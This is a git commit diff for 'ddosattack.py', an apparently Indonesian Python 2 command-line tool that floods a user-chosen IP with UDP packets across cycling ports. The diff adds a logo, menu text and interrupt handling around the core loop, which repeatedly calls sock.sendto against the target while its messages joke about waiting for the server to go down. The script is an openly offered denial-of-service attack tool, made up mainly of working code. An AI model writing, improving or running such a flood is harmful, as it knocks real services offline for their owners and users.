09738de274568c2081a98cc0c747153fcf0bd578
Step By Step <52529306+stepbystepexe@users.noreply.github.com>
2020-03-05 22:47:58 +0700

    Update ddosattack.py

--- ddosattack.py
+++ ddosattack.py
@@ -4,8 +4,8 @@
 # Coded by Nedi Senja
 # Github: https://github.com/stepbystepexe/Ddosattack
 
-from __opt__ import *
-import os, sys, time, random, socket, string, marshal
+import os, sys, time, random, socket, string, requests
+from time import sleep
 from datetime import datetime
 
 info = """
@@ -26,7 +26,13 @@ NB          : Manusia gax ada yang sempurna
 
 [ \033[4mGunakan tool ini dengan bijak \033[0m]\n """
 
-example = """\033[0;104;77;1m[      Denial of Service, My Github: @stepbystepexe      ]\033[0m"""
+example = """\033[0;104;77;1m[          Ddosattack, My Github: @stepbystepexe         ]\033[0m"""
+
+logo = """
+ \033[0;33m█▀▀▀▄ █▀▀▀▄ █▀▀▀█ █▀▀▀▀   \033[0;31m█▀▀▀█ ▀▀█▀▀ █▀▀▀█ █▀▀▀▀ █   █
+ \033[0;33m█   █ █   █ █   █ ▀▀▀▀█   \033[0;31m█▀▀▀█   █   █▀▀▀█ █     █▀▀▀▄
+ \033[0;33m▀▀▀▀  ▀▀▀▀  ▀▀▀▀▀ ▀▀▀▀▀   \033[0;31m▀   ▀   ▀   ▀   ▀ ▀▀▀▀▀ ▀   ▀
+"""
 
 now = datetime.now()
 hour = now.hour
@@ -43,10 +49,10 @@ def restart():
     curdir = os.getcwd()
 
 def loads():
-    x = [
+    o = [
      '.   ', '..  ', '... ']
-    for o in x:
-        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mMemulai ' + o,
+    for i in o:
+        print '\r\033[0m[\033[0;34m●\033[0m] Loading ' +i,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -57,50 +63,69 @@ def write(o):
         time.sleep(0.03)
 
 def config():
-    ip = raw_input("\n\033[0m[\033[93;1m+\033[0m] \033[77;1mIP Target: \033[0m")
-    port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mPort: \033[0m")
+    os.system('clear')
+    os.system('reset')
+    sleep(1)
     print
-    write("\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMengecek ...")
-    time.sleep(1)
+    print(logo)
+    print(example)
+    print
+    write("\033[0m[ \033[32mINFO \033[0m] \033[3mSembari menunggu servernya down mari kita sama2")
+    write("         Sediakan kopi, roko + cemilan biar gx pusing Gan\033[0m\n\n")
+    ip = raw_input("\033[0m[\033[42;90;1m Hostname \033[0m] ")
+    port = input("\033[0m[\033[101;77;1m   Port   \033[0m] ")
+    print
+    write("\n\033[0m[\033[33m●\033[0m] \033[77;1mSedang mengecek IP ...\033[0m")
+    sleep(1)
     print
     print("[ IIIIIIIIIIII Loads       15%                          ]")
-    time.sleep(5)
+    sleep(5)
     print("[ IIIIIIIIIIIIIIIIII Loads       25%                    ]")
-    time.sleep(5)
+    sleep(5)
     print("[ IIIIIIIIIIIIIIIIIIIIIIII Loads       50%              ]")
-    time.sleep(5)
+    sleep(5)
     print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       75%        ]")
-    time.sleep(5)
+    sleep(5)
     print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       100% ]")
     print
     loads()
     print
-    time.sleep(3)
+    sleep(3)
     sent = 0
-    while True:
-         sock.sendto(bytes,(ip,port))
-         sent = sent + 1
-         port = port + 1
-         print "\033[0mMengirim \033[1;2;96m%s \033[0mPaket ke %s Target \033[1;2;91m%s"%(sent, ip, port)
-         if port == 65534:
-           port = 1
+    try:
+        while True:
+            sock.sendto(bytes,(ip,port))
+            sent = sent + 1
+            port = port + 1
+            print("\033[0mMengirim \033[1;2;96m%s \033[0mPaket ke %s Target \033[1;2;91m%s")%(sent, ip, port)
+            if port == 65534:
+               port = 1
+    except KeyboardInterrupt:
+            print
+            print
+            print('\033[0m[\033[91;1m!\033[0m] \033[77;1mBerhenti\033[0m')
+            print
+            sleep(1)
+            restart()
 
 os.system('clear')
 os.system('reset')
-time.sleep(1)
+sleep(1)
 print
 print(logo)
 print(example)
 print
-print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Ddosattack")
+print("\033[0m[\033[1;96;2m1\033[0m] \033[1;77mMulai Ddosattack")
 print
 print("\033[0m[\033[93;1m&\033[0m] LISENSI")
 print("\033[0m[\033[94;1m#\033[0m] Informasi")
 print("\033[0m[\033[92;1m*\033[0m] Perbarui")
 print("\033[0m[\033[91;1m-\033[0m] Keluar")
 print
-option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
-if option.strip() in 'あ 1 mulai'.split():
+option = raw_input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mMasukan opsi: \033[0m")
+if option.strip() in '1 mulai'.split():
+    write("\n\033[0m[\033[32m●\033[0m] \033[77;1mSedang memproses ...\033[0m")
+    sleep(1)
     config()
 elif option.strip() in '& 2 lisensi'.split():
     print
@@ -112,7 +137,7 @@ elif option.strip() in '# 3 info'.split():
     print(example)
     os.system('toilet -f smslant Attacks')
     print(info)
-    time.sleep(1)
+    sleep(1)
     print
     raw_input('[ Tekan Enter ]')
     restart()
@@ -120,14 +145,14 @@ elif option.strip() in '* 4 perbarui'.split():
     print
     os.system('git pull origin master')
     print
-    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
+    raw_input('\033[0m[ \033[32mTekan Enter \033[0m]')
     restart()
-elif option.strip() in '- keluar 0'.split():
+elif option.strip() in '- 0 keluar'.split():
     print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
     print
     sys.exit(1)
 else:
     print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
     print
-    time.sleep(1)
+    sleep(1)
     restart()
